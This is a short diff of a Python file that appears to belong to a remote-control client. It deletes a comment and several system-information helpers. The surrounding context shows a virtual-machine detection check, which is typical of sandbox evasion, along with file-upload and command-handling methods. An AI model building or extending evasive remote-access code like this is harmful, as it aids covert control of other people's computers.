@@ -112,7 +112,7 @@ def check_vm():
             except:
                 pass
         
-        # Return True only if multiple indicators are found
+        
         return vm_count >= 3
                 
     except:
@@ -390,43 +390,6 @@ class ClientHandler:
             }
         except Exception as e:
             return {'error': str(e)}
-
-    def get_cpu_usage(self):
-        try:
-            return psutil.cpu_percent(interval=1)
-        except:
-            return 0
-    
-    def get_memory_usage(self):
-        try:
-            mem = psutil.virtual_memory()
-            return {
-                'total': mem.total,
-                'available': mem.available,
-                'percent': mem.percent,
-                'used': mem.used,
-                'free': mem.free
-            }
-        except:
-            return {'error': 'Failed to get memory information'}
-
-    def get_computer_name(self):
-        try:
-            return platform.node()
-        except:
-            return 'Unknown'
-
-    def get_os_info(self):
-        try:
-            return {
-                'system': platform.system(),
-                'release': platform.release(),
-                'version': platform.version(),
-                'machine': platform.machine(),
-                'processor': platform.processor()
-            }
-        except:
-            return {'error': 'Failed to get OS information'} 
         
     def upload(self,filename):
         current_path =  os.path.abspath(os.getcwd())
@@ -514,7 +477,6 @@ class ClientHandler:
                 continue
             else:
                 break
-
 
     def handle_commands(self,os_name):
         while True:
